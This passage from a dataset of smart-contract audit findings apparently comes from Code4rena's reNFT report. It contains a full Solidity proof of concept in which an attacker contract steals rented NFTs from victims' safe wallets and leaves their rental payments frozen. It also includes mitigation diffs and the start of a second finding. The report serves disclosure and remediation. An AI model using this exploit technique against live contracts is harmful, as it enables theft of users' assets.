*is* considered when deriving the `orderHash`:\n\n[Signer::\\_deriveRentalOrderHash#L181-L186](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L181-L186)\n\n```solidity\n181:        return\n182:            keccak256(\n183:                abi.encode(\n184:                    _RENTAL_ORDER_TYPEHASH,\n185:                    order.seaportOrderHash,\n186:                    keccak256(abi.encodePacked(itemHashes)), // items correctly included in the derived EIP-712 hash\n```\n\nTherefore, this exploit can only occur for ERC1155 tokens since the malicious actor would need to first create a `RentalOrder` for the same ERC1155 tokens (amount and tokenId) as the victim's `RentalOrder`. This is not possible for ERC721 tokens since they are non-fungible. The result of this lesser impact is that the malicious actor stole the ERC1155 tokens from the victim, froze the victim's rental payment, and the malicious actor's originally rented ERC1155 tokens will remain frozen in their `safe wallet` (this is due to the fact that the malicious actor's `orderhash` has been removed from storage and therefore can no longer be stopped/reclaimed).\n\n*Note: Since the \"lesser\" impact above (see gist) can still be considered of `high` severity/impact I will include an additional PoC for this exploit at the end of the `Proof of Concept` section, in the form of a gist*.\n\n### Main Impact\n\nA malicious actor is able to steal any actively rented NFT using the exploit path detailed in the first section. The capital requirements for the exploiter are as follows: 1) Have at least `1 wei` of an ERC20 that will be used to create a malicious `RentalOrder` (the exploiter will receive these funds back at the end of the exploit). 2) create and deploy a `attackerContract` and a `safe wallet` (gas costs). 3) Additional gas costs will be incurred if exploiting several `victim RentalOrders` at once via `stopRentBatch`.\n\nThis will result in the specified NFT to be stolen from the victim's `safe wallet` and transferred to the attacker's `safe wallet`. Since the attacker's rental order was atomically created and stopped during this function call, no one will be able to call `stopRent` for this `malicious RentalOrder`, rendering the stolen NFT frozen in the attacker's `safe wallet`. Additionally, the `victim RentalOrders` will not be able to be stopped upon expiration since the reclamation process that occurs during the `stopRent` function call will fail (`victim safe wallet` no longer is the owner of the stolen NFT). This will result in the rental payment for this `victim RentalOrder` to be frozen in the `escrow` contract. An exploiter is able to prepare this exploit for multiple `victim RentalOrders` and steal multiple NFTs in one transaction via `stopRentBatch`.\n\n### Proof of Concept\n\nIn order to provide more context for the PoC provided below, I will detail the steps that are occuring in the PoC:\n\n1.  Two orders are created (these will act as our victim orders). One will be for an ERC721 token and the other will be for an ERC1155 token.\n2.  Our `attackerContract` is created.\n3.  `x` amount of wei (for an arbitrary ERC20) is sent to our `attackerContract`. `x == num_of_victim_orders`. These funds will be used when the `attackerContract` programatically creates the malicious rental orders (our `attackerContract` will behave as `lender` and `renter`).\n4.  A `safe wallet` is created (`attacker safe`) and our `attackerContract` is initialized as an owner for that safe.\n5.  A generic signature is obtained via a `OrderMetadata` struct from one of the target orders that were initially created (in practice the order used can be any order).\n6.  `Order` structs were created and partially filled with values that pertain to the `PAY` and `PAYEE` orders that our `attackerContract` will create on-chain via `Seaport::validate`. The only fields that are not set during this process are the `OfferItem` or `ConsiderationItem` fields that specify the ERC721 or ERC1155 token that we will be stealing (these are dyanmic and therefore are determined during the callback functions). The `Order` structs are then stored in the `attackerContract` for later use.\n7.  This same process is done for the `AdvancedOrder` structs that are required for the fulfillment transaction (i.e. `Seaport::matchAdvancedOrders`). The `AdvancedOrder` structs are then stored in the `attackerContract` for later use.\n8.  The `Fulfillment` struct (required during the `Seaport::matchAdvancedOrders` function call) is pre-constructed. This struct willl remain the same for all of our order creations. This struct is also stored in the `attackerContract` for later use.\n9.  The `RentalOrder.seaportOrderHash` (this is the same as the `orderHash` that is computed for our `Order` during the call to `Seaport::validate`) is pre-computed via  `Seaport::getOrderHash`. Note that this `orderHash` needs to be computed with a complete `Order` struct. Since our `Order` structs were only partially filled during step 6, we will use the `RentalOrder.items` field of the target `RentalOrder` to retrieve the details of the ERC721/ERC1155 token(s) that we will be stealing. We will then use these details to temporarily construct our actual `Order` struct and therefore pre-compute the required `orderHash`.\n10. Using the `items` field of the `victim RentalOrder`, we will create our malicious `RentalOrder`.\n11. The `attackerContract` will initiate a call to `stopRent` and pass in our malicious `RentalOrder`. However, we will first set `RentalOrder.rentalWallet` equal to the `rentalWallet` of our victim `RentalOrder` (the `safe wallet` that we will be stealing the NFT from).\n12. Steps 9 - 11 will be performed for multiple victim `RentalOrders` by looping over the orders and computing the necessary malicious `RentalOrders`. This time, instead of the `attackerContract` initiating a call to `stopRent`, a call to `stopRentBatch` will be initiated and an array of the malicious `RentalOrders` will be supplied.\n13. The resulting state will be validated: `attacker safe` is now the owner of all the stolen NFTs and the victim `RentalOrders` can no longer be stopped (even after their expiration).\n\nPlace the following test inside of the `/test/integration/` directory and run test with `forge test --mc StealAllRentedNFTs_POC`\n\nThe below PoC showcases how an attacker can leverage all the bugs described in this report to steal multiple actively rented NFTs via `stopRentBatch`.\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {BaseTest} from \"@test/BaseTest.sol\";\n\nimport {\n    OrderType, \n    OrderMetadata, \n    RentalOrder,\n    RentPayload,\n    OrderFulfillment,\n    Item,\n    SettleTo,\n    ItemType as reNFTItemType\n} from \"@src/libraries/RentalStructs.sol\";\n\nimport {\n    ConsiderationItem,\n    OfferItem,\n    OrderParameters,\n    OrderComponents,\n    Order,\n    AdvancedOrder,\n    ItemType,\n    CriteriaResolver,\n    Fulfillment, \n    FulfillmentComponent,\n    OrderType as SeaportOrderType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\nimport {MockERC721} from \"../mocks/tokens/standard/MockERC721.sol\";\nimport {MockERC20} from \"../mocks/tokens/standard/MockERC20.sol\";\nimport {MockERC1155} from \"../mocks/tokens/standard/MockERC1155.sol\";\nimport {Seaport} from \"../fixtures/external/Seaport.sol\";\nimport {OrderParametersLib} from \"@seaport-sol/SeaportSol.sol\";\nimport {SafeL2} from \"@safe-contracts/SafeL2.sol\";\nimport {Stop} from \"../fixtures/protocol/Protocol.sol\";\n\n\ncontract AttackerContract {\n    address safe;\n    address seaportConduit;\n    Seaport seaport;\n    Order payOrder;\n    Order payeeOrder;\n    AdvancedOrder payAdvancedOrder;\n    AdvancedOrder payeeAdvancedOrder;\n    Fulfillment fulfillmentERC721;\n    Fulfillment fulfillmentERC20;\n\n    constructor (address _conduit, address _token, Seaport _seaport) public {\n        seaportConduit = _conduit;\n        seaport = _seaport;\n        MockERC20(_token).approve(_conduit, type(uint256).max);\n    }\n\n    function getPayOrderParams() external view returns (OrderParameters memory) {\n        return payOrder.parameters;\n    }\n\n    function getPayeeOrderParams() external view returns (OrderParameters memory) {\n        return payeeOrder.parameters;\n    }\n\n    function getPayOrderParamsToHash(\n        ItemType itemType, \n        address token, \n        uint256 tokenId, \n        uint256 amount\n    ) external view returns (OrderParameters memory) {\n        OrderParameters memory parameters = payOrder.parameters;\n        parameters.offer[0].itemType = itemType;\n        parameters.offer[0].token = token;\n        parameters.offer[0].identifierOrCriteria = tokenId;\n        parameters.offer[0].startAmount = amount;\n        parameters.offer[0].endAmount = amount;\n\n        return parameters;\n    }\n\n    function storeSafe(address _safe) external {\n        safe = _safe;\n    }\n\n    function storePayOrder(Order calldata _order) external {\n        payOrder = _order;\n    }\n\n    function storePayeeOrder(Order calldata _order) external {\n        payeeOrder = _order;\n    }\n\n    function storePayAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {\n        payAdvancedOrder = _advancedOrder;\n    }\n\n    function storePayeeAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {\n        payeeAdvancedOrder = _advancedOrder;\n    }\n\n    function storeFulfillment(Fulfillment calldata _fulfillmentERC721, Fulfillment calldata _fulfillmentERC20) external {\n        fulfillmentERC721 = _fulfillmentERC721;\n        fulfillmentERC20 = _fulfillmentERC20;\n    }\n\n    function stopRental(RentalOrder calldata rentalOrder, Stop stop) external {\n        stop.stopRent(rentalOrder);\n    }\n\n    function stopRentals(RentalOrder[] calldata rentalOrders, Stop stop) external {\n        stop.stopRentBatch(rentalOrders);\n    }\n\n    function onERC1155Received(\n        address ,\n        address ,\n        uint256 tokenId,\n        uint256 amount,\n        bytes calldata\n    ) external returns (bytes4) {\n        address token = msg.sender;\n\n        _executeCallback(ItemType.ERC1155, token, tokenId, amount);\n\n        return this.onERC1155Received.selector;\n    }\n\n    function onERC721Received(\n        address ,\n        address ,\n        uint256 tokenId,\n        bytes calldata \n    ) external returns (bytes4) {\n        address token = msg.sender;\n        uint256 amount = 1;\n        \n        _executeCallback(ItemType.ERC721, token, tokenId, amount);\n\n        return this.onERC721Received.selector;\n    }\n\n    function _executeCallback(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {\n        // update storage for this specific nft\n        _initializeNFT(itemType, token, tokenId, amount);\n\n        // approve seaport to handle received NFT \n        _approveSeaportConduit(itemType, token, tokenId);\n\n        // validate pay order \n        _validateOnChain(payOrder);\n\n        // validate payee order\n        _validateOnChain(payeeOrder);\n\n        // fulfill order as renter\n        _fulfillOrder();\n    }\n\n    function _approveSeaportConduit(ItemType itemType, address token, uint256 tokenId) internal {\n        if (itemType == ItemType.ERC721) {\n            MockERC721(token).approve(seaportConduit, tokenId);\n        }\n        if (itemType == ItemType.ERC1155) {\n            MockERC1155(token).setApprovalForAll(seaportConduit, true);\n        }\n    }\n\n    function _validateOnChain(Order memory order) internal {\n        Order[] memory orders = new Order[](1);\n        orders[0] = order;\n        seaport.validate(orders);\n    }\n\n    function _fulfillOrder() internal {\n        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);\n        advancedOrders[0] = payAdvancedOrder;\n        advancedOrders[1] = payeeAdvancedOrder;\n\n        Fulfillment[] memory fulfillments = new Fulfillment[](2);\n        fulfillments[0] = fulfillmentERC721;\n        fulfillments[1] = fulfillmentERC20;\n\n        seaport.matchAdvancedOrders(\n            advancedOrders,\n            new CriteriaResolver[](0),\n            fulfillments,\n            address(0)\n        );\n    }\n\n    function _initializeNFT(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {\n        payAdvancedOrder.parameters.offer[0].itemType = itemType;\n        payAdvancedOrder.parameters.offer[0].token = token;\n        payAdvancedOrder.parameters.offer[0].identifierOrCriteria = tokenId;\n        payAdvancedOrder.parameters.offer[0].startAmount = amount;\n        payAdvancedOrder.parameters.offer[0].endAmount = amount;\n\n        payeeAdvancedOrder.parameters.consideration[0].itemType = itemType;\n        payeeAdvancedOrder.parameters.consideration[0].token = token;\n        payeeAdvancedOrder.parameters.consideration[0].identifierOrCriteria = tokenId;\n        payeeAdvancedOrder.parameters.consideration[0].startAmount = amount;\n        payeeAdvancedOrder.parameters.consideration[0].endAmount = amount;\n        payeeAdvancedOrder.parameters.consideration[0].recipient = payable(safe);\n\n        payOrder.parameters.offer[0].itemType = itemType;\n        payOrder.parameters.offer[0].token = token;\n        payOrder.parameters.offer[0].identifierOrCriteria = tokenId;\n        payOrder.parameters.offer[0].startAmount = amount;\n        payOrder.parameters.offer[0].endAmount = amount;\n\n        payeeOrder.parameters.consideration[0].itemType = itemType;\n        payeeOrder.parameters.consideration[0].token = token;\n        payeeOrder.parameters.consideration[0].identifierOrCriteria = tokenId;\n        payeeOrder.parameters.consideration[0].startAmount = amount;\n        payeeOrder.parameters.consideration[0].endAmount = amount;\n        payeeOrder.parameters.consideration[0].recipient = payable(safe);\n    }\n}\n\ncontract StealAllRentedNFTs_POC is BaseTest {\n\n    function testStealAllRentedNFTs() public {\n        // ------ Setting up previous state ------ //\n\n        // create and fulfill orders that we will exploit\n        (\n            Order memory order, \n            OrderMetadata memory metadata, \n            RentalOrder[] memory victimRentalOrders\n        ) = _createAndFulfillVictimOrders();\n\n        // ------ Prerequisites ------ //\n\n        // instantiate attackerContract\n        AttackerContract attackerContract = new AttackerContract(\n            address(conduit), // seaport conduit\n            address(erc20s[0]), // token we will use for our rental orders\n            seaport\n        );\n\n        // send arbitrary # of ERC20 tokens for rental payment to our attackerContract\n        erc20s[0].mint(address(attackerContract), victimRentalOrders.length); // we will be stealing from two rentals and use 1 wei for each\n\n        // create a safe for our attackerContract\n        address attackerSafe;\n        { // to fix stack too deep errors\n            address[] memory owners = new address[](1);\n            owners[0] = address(attackerContract);\n            attackerSafe = factory.deployRentalSafe(owners, 1);\n        }\n        attackerContract.storeSafe(attackerSafe);\n        \n        // obtain generic signature for `RentPayload` \n        // this is done via the front-end for any order and we will then use matching `OrderMetadata.rentDuration` and `OrderMetadata.hooks` fields when creating our new order\n        // `RentPayload.intendedFulfiller` will be our attackerContract and `RentPayload.fulfillment` will be our attackerContract's safe\n        // any expiration given to us by the front-end would do since we will be executing these actions programmatically\n        RentPayload memory rentPayload = RentPayload(\n            OrderFulfillment(attackerSafe), \n            metadata, \n            block.timestamp + 100, \n            address(attackerContract)\n        ); // using Alice's metadata (order) as an example, but could realistically be any order\n\n        // generate the signature for the payload (simulating signing an order similar to Alice's (metadata only) via the front end)\n        bytes memory signature = _signProtocolOrder(\n            rentalSigner.privateKey,\n            create.getRentPayloadHash(rentPayload)\n        );\n\n        // ------ Prep `attackerContract` ------ //\n\n        // precompute `validate()` calldata for new order (PAY order) for on-chain validation\n        // re-purpose Alice's order (for simplicity) for our use by replacing all necessary fields with values that pertain to our new order\n        order.parameters.offerer = address(attackerContract);\n        { // to fix stack too deep errors\n            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](0);\n            order.parameters.consideration = considerationItems; // no consideration items for a PAY order\n\n            OfferItem[] memory offerItems = new OfferItem[](2);\n            // offerItems[0] will change dynamically in our attacker contract\n            offerItems[1] = OfferItem({\n                itemType: ItemType.ERC20,\n                token: address(erc20s[0]),\n                identifierOrCriteria: uint256(0),\n                startAmount: uint256(1),\n                endAmount: uint256(1)\n            });\n\n            order.parameters.offer = offerItems;\n\n            order.parameters.totalOriginalConsiderationItems = 0; // 0 since this is a PAY order\n            \n            // store `validate()` calldata for PAY order in attackerContract for later use\n            attackerContract.storePayOrder(order);\n        }\n\n        // precompute `validate()` calldata for new order (PAYEE order) for on-chain validation (attackerContract is offerer and fulfiller)\n        { // to fix stack too deep errors\n            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);\n            // considerationItems[0] will change dynamically in our attacker contract\n            considerationItems[1] = ConsiderationItem({\n                itemType: ItemType.ERC20,\n                token: address(erc20s[0]),\n                identifierOrCriteria: uint256(0),\n                startAmount: uint256(1),\n                endAmount: uint256(1),\n                recipient: payable(address(ESCRW))\n            });\n\n            order.parameters.consideration = considerationItems; // considerationItems for PAYEE mirror offerItems from PAY\n\n            OfferItem[] memory offerItems = new OfferItem[](0);\n            order.parameters.offer = offerItems; // no offerItems for PAYEE\n\n            order.parameters.totalOriginalConsiderationItems = 2; // 2 since this is our PAYEE order\n\n            // store `validate()` calldata for PAYEE order in attackerContract for later use\n            attackerContract.storePayeeOrder(order);\n        }\n\n        // precompute `matchAdvancedOrders()` calldata for fulfillment of the two orders (PAY + PAYEE) and store in attackerContract\n        // construct AdvancedOrder[] calldata\n        { // to fix stack too deep errors\n            rentPayload.metadata.orderType = OrderType.PAY; // modify OrderType to be a PAY order (necessary for exploit). orderType not checked during signature validation\n            AdvancedOrder memory payAdvancedOrder = AdvancedOrder(\n                attackerContract.getPayOrderParams(), \n                1, \n                1, \n                hex\"\",  // signature does not matter \n                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata\n            );\n            rentPayload.metadata.orderType = OrderType.PAYEE; // modify OrderType to be a PAYEE order (necessary for exploit). orderType not checked during signature validation\n            AdvancedOrder memory payeeAdvancedOrder = AdvancedOrder(\n                attackerContract.getPayeeOrderParams(), \n                1, \n                1, \n                hex\"\",  // signature does not matter \n                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata\n            );\n            \n            // store AdvancedOrder structs in attackerContract for later use\n            attackerContract.storePayAdvancedOrder(payAdvancedOrder);\n            attackerContract.storePayeeAdvancedOrder(payeeAdvancedOrder);\n        }\n\n        // construct Fulfillment[] calldata\n        { // to fix stack too deep errors\n            FulfillmentComponent[] memory offerCompERC721 = new FulfillmentComponent[](1);\n            FulfillmentComponent[] memory considCompERC721 = new FulfillmentComponent[](1);\n\n            offerCompERC721[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 0});\n            considCompERC721[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 0});\n\n            FulfillmentComponent[] memory offerCompERC20 = new FulfillmentComponent[](1);\n            FulfillmentComponent[] memory considCompERC20 = new FulfillmentComponent[](1);\n\n            offerCompERC20[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 1});\n            considCompERC20[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 1});\n\n            Fulfillment memory fulfillmentERC721 = Fulfillment({offerComponents: offerCompERC721, considerationComponents: considCompERC721});\n            Fulfillment memory fulfillmentERC20 = Fulfillment({offerComponents: offerCompERC20, considerationComponents: considCompERC20});\n            \n            // store Fulfillment[] in attackerContract for later use\n            attackerContract.storeFulfillment(fulfillmentERC721, fulfillmentERC20);\n        }\n\n        // ------ loop through victimRentalOrders to create our complimentary, malicious rentalOrders ------ //\n\n        // pre-compute `RentalOrder` for our new rental orders\n        // compute ZoneParameters.orderHash (this is the orderHash for our PAY order)\n        RentalOrder[] memory rentalOrders = new RentalOrder[](victimRentalOrders.length);\n\n        for (uint256 i; i < victimRentalOrders.length; i++) {\n            Item memory victimItem = victimRentalOrders[i].items[0];\n            ItemType itemType;\n            if (victimItem.itemType == reNFTItemType.ERC721) {\n                itemType = ItemType.ERC721;\n            }\n            if (victimItem.itemType == reNFTItemType.ERC1155) {\n                itemType = ItemType.ERC1155;\n            }\n\n            bytes32 orderHash = seaport.getOrderHash(OrderParametersLib.toOrderComponents(\n                attackerContract.getPayOrderParamsToHash(itemType, victimItem.token, victimItem.identifier, victimItem.amount), 0)\n            );\n\n            // construct the malicious rental order\n            Item[] memory items = new Item[](2);\n            items[0] = Item(victimItem.itemType, SettleTo.LENDER, victimItem.token, victimItem.amount, victimItem.identifier);\n            items[1] = Item(reNFTItemType.ERC20, SettleTo.RENTER, address(erc20s[0]), uint256(1), uint256(0)); // the same for every malicious order\n\n            RentalOrder memory rentalOrder = RentalOrder({\n                seaportOrderHash: orderHash,\n                items: items, // only PAY order offer items are added in storage\n                hooks: metadata.hooks,\n                orderType: OrderType.PAY, // only PAY order is added in storage\n                lender: address(attackerContract),\n                renter: address(attackerContract),\n                rentalWallet: attackerSafe,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration // note: rentDuration does not matter\n            });\n\n            // set `rentalOrder.rentalWallet` (currently equal to our attackerContract's safe) to be equal to the victim's safe\n            rentalOrder.rentalWallet = victimRentalOrders[i].rentalWallet;\n\n            rentalOrders[i] = rentalOrder;\n        }\n\n        // ------ Execute exploit ------ //\n\n        // call `stopRentBatch(rentalOrders)`. All fields pertain to our soon-to-be created orders, except for the `rentalWallet`, which is pointing to the victim's safe\n        // attackerContract.stopRental(rentalOrder[0], stop);\n        // attackerContract.stopRental(rentalOrder[1], stop);\n        attackerContract.stopRentals(rentalOrders, stop);\n        \n        // ------ Loop over all victimRentalOrders to verify end state ------ //\n\n        // speed up in time past the victimRentalOrders' expiration\n        vm.warp(block.timestamp + 750);\n\n        for (uint256 i; i < victimRentalOrders.length; i++) {\n            Item memory victimItem = victimRentalOrders[i].items[0];\n\n            // verify that our attackerContract's safe is now the owner of the NFT\n            if (victimItem.itemType == reNFTItemType.ERC721) {\n                assertEq(MockERC721(victimItem.token).ownerOf(victimItem.identifier), attackerSafe);\n            }\n            if (victimItem.itemType == reNFTItemType.ERC1155) {\n                assertEq(MockERC1155(victimItem.token).balanceOf(attackerSafe, victimItem.identifier), victimItem.amount);\n            }\n\n            // verify that our rentalOrder has been stopped (deleted from storage)\n            RentalOrder memory rentalOrder = rentalOrders[i];\n            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n            assertEq(STORE.orders(rentalOrderHash), false);\n\n            // lender attempts to stop victimRentalOrder, but call fails (renter's safe is no longer the owner of the NFT)\n            vm.startPrank(victimRentalOrders[i].lender);\n            vm.expectRevert();\n            stop.stopRent(victimRentalOrders[i]);\n            vm.stopPrank();\n\n            // verify that victimRentalOrder has not been stopped (is still in storage)\n            bytes32 victimRentalOrderHash = create.getRentalOrderHash(victimRentalOrders[i]);\n            assertEq(STORE.orders(victimRentalOrderHash), true);\n        }\n\n        // renters' rental payments to lenders' is still in the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(victimRentalOrders.length * 100));\n\n        // verify that our attackerContract received its rental payment back from all the created malicious orders\n        assertEq(erc20s[0].balanceOf(address(attackerContract)), victimRentalOrders.length);\n\n        // End result:\n        // 1. Lenders' NFTs were stolen from renters' safe wallet and is now frozen in the attackerContract's safe wallet\n        // 2. Renters' rental payments to Lenders are frozen in the Escrow contract since their rentals can not be stoppped\n    }\n\n    function _createAndFulfillVictimOrders() internal returns (\n        Order memory order, \n        OrderMetadata memory metadata,\n        RentalOrder[] memory rentalOrders\n    ) {\n        // create a BASE order ERC721\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the order creation \n        (\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: order,\n            orderHash: orderHash,\n            metadata: metadata\n        });\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrderA = finalizeBaseOrderFulfillment();\n        bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrderA);\n\n        // assert that the rental order was stored\n        assertEq(STORE.orders(rentalOrderHash), true);\n\n        // assert that the token is in storage\n        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n\n        // assert that the fulfiller made a payment\n        assertEq(erc20s[0].balanceOf(bob.addr), uint256(9900));\n\n        // assert that a payment was made to the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));\n\n        // assert that a payment was synced properly in the escrow contract\n        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n\n        // assert that the ERC721 is in the rental wallet of the fulfiller\n        assertEq(erc721s[0].ownerOf(0), address(bob.safe));\n\n        // create a BASE order ERC1155\n        createOrder({\n            offerer: carol,\n            orderType: OrderType.BASE,\n            erc721Offers: 0,\n            erc1155Offers: 1,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the order creation \n        (\n            order,\n            orderHash,\n            metadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment\n        createOrderFulfillment({\n            _fulfiller: dan,\n            order: order,\n            orderHash: orderHash,\n            metadata: metadata\n        });\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrderB = finalizeBaseOrderFulfillment();\n        rentalOrderHash = create.getRentalOrderHash(rentalOrderB);\n\n        // assert that the rental order was stored\n        assertEq(STORE.orders(rentalOrderHash), true);\n\n        // assert that the token is in storage\n        assertEq(STORE.isRentedOut(address(dan.safe), address(erc1155s[0]), 0), true);\n\n        // assert that the fulfiller made a payment\n        assertEq(erc20s[0].balanceOf(dan.addr), uint256(9900));\n\n        // assert that a payment was made to the escrow contract\n        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(200));\n\n        // assert that a payment was synced properly in the escrow contract\n        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(200));\n\n        // assert that the ERC721 is in the rental wallet of the fulfiller\n        assertEq(erc1155s[0].balanceOf(address(dan.safe), 0), uint256(100));\n\n        RentalOrder[] memory rentalOrders = new RentalOrder[](2);\n        rentalOrders[0] = rentalOrderA;\n        rentalOrders[1] = rentalOrderB;\n\n        return (order, metadata, rentalOrders);\n    }\n}\n```\n\n</details>\n\n\n**Additional PoC for \"lesser\" `high` severity/impact vulnerability achieved via only exploiting bug `#2`: [reNFT-StealERC1155Tokens_PoC.md](https://gist.github.com/0xJCN/f8cae30d0e3f9d8c6f05a4a4fa9d2558)**\n\n### Recommended Mitigation Steps\n\nBy addressing the non-compliant EIP-712 functions we can mitigate the main exploit path described in this report. I would suggest the following changes:\n\n```diff\ndiff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol\nindex 6edf32c..ab7e62e 100644\n--- a/./src/packages/Signer.sol\n+++ b/./src/packages/Signer.sol\n@@ -188,6 +188,7 @@ abstract contract Signer {\n                     order.orderType,\n                     order.lender,\n                     order.renter,\n+                    order.rentalWallet,\n                     order.startTimestamp,\n                     order.endTimestamp\n                 )\n```\n\n```diff\ndiff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol\nindex 6edf32c..c2c375c 100644\n--- a/./src/packages/Signer.sol\n+++ b/./src/packages/Signer.sol\n@@ -232,8 +232,10 @@ abstract contract Signer {\n             keccak256(\n                 abi.encode(\n                     _ORDER_METADATA_TYPEHASH,\n+                    metadata.orderType,\n                     metadata.rentDuration,\n-                    keccak256(abi.encodePacked(hookHashes))\n+                    keccak256(abi.encodePacked(hookHashes)),\n+                    metadata.emittedExtraData\n                 )\n             );\n     }\n```\n\nI would also suggest that the `RentPayload`, which is the signature digest of the server-side signer, be modified to include a field that is unique to the specific order that is being signed. This would disable users from obtaining a single signature and utilizing that signature arbitrarily (for multiple fulfillments/fulfill otherwise \"restricted\" orders).\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/418#issuecomment-1922074348)**\n\n_Note: See full discussion [here](https://github.com/code-423n4/2024-01-renft-findings/issues/418)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> Mitigation of this issue is the result of mitigating a handful of other findings (H-07, M-13, M-11, M-06).\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/45), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/34) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/6).\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the `Stop.sol` smart contract for the reNFT project. The vulnerability allows an attacker to steal and freeze any rented NFT (non-fungible token) and the associated rental payments. This is possible due to several bugs, including the lack of validation for a non-existent rental order, a predictable signature digest, and non-compliance with EIP-712 standards. The report outlines the steps an attacker can take to exploit this vulnerability and suggests adding a unique field to the signature digest to prevent arbitrary use. The reNFT team has confirmed and mitigated this issue by addressing other related findings. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/418",
      "tags": [],
      "finders": [
        "3",
        "ravikiranweb3",
        "JCN",
        "trachev",
        "Audinarey",
        "juancito",
        "rbserver",
        "KupiaSec",
        "krikolkk",
        "J4X",
        "0xDING99YA",
        "AkshaySrivastav",
        "0xpiken",
        "ABAIKUNANBAEV",
        "Aymen0909",
        "serial-coder",
        "evmboi32",
        "Ward",
        "zach",
        "1",
        "Krace",
        "2",
        "fnanni",
        "hash",
        "rvierdiiev"
      ]
    },
    {
      "id": "30524",
      "title": "[H-04] Incorrect `gnosis_safe_disable_module_offset` constant leads to removing the rental safe's `module` without verification",
      "impact": "HIGH",
      "content": "\nThe `gnosis_safe_disable_module_offset` constant was incorrectly specified to point at an incorrect function parameter of the `disableModule(address prevModule, address module)`.\n\nSpecifically, the offset constant will point at the `prevModule` (1st param) instead of the `module` (2nd param).\n\n### Impact\n\nWhen a safe transaction initiated from a rental safe containing a call to the safe's `disableModule()` is invoked, the `Guard::checkTransaction()` cannot verify the `module` expected to be removed.\n\nIf the `prevModule` was a non-whitelisted extension, the safe transaction will be reverted.\n\nHowever, if the `prevModule` was a whitelisted extension, the `module` will be removed without verification. Removing the rental safe's `module` without verification can lead to other issues or attacks since the removed `module` can be a critical component (e.g., removing the protocol's `Stop` policy contract).\n\n### Proof of Concept\n\nThe snippet below presents some of the Gnosis Safe configurations of the `reNFT protocol`. The [`gnosis_safe_disable_module_selector`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L58) constant contains the function selector (`0xe009cfde`) of the rental safe's `ModuleManager::disableModule(address prevModule, address module)`.\n\nMeanwhile, the [`gnosis_safe_disable_module_offset`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol#L62) constant contains a memory offset (`0x24`) intended to point at the `module` param of the `disableModule()`.\n\n```solidity\n    // FILE: https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/libraries/RentalConstants.sol\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                  Gnosis Safe Function Selectors And Offsets                 //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    ...\n\n    // bytes4(keccak256(\"disableModule(address,address)\"));\n@1  bytes4 constant gnosis_safe_disable_module_selector = 0xe009cfde; //@audit -- The declaration of function selector: ModuleManager::disableModule(address prevModule, address module)\n\n    ...\n\n@2  uint256 constant gnosis_safe_disable_module_offset = 0x24; //@audit -- The memory offset intended to point at the 'module' param of the disableModule() was incorrectly specified to the 'prevModule' param instead\n```\n\n*   `@1 -- The declaration of function selector: ModuleManager::disableModule(address prevModule, address module)`: 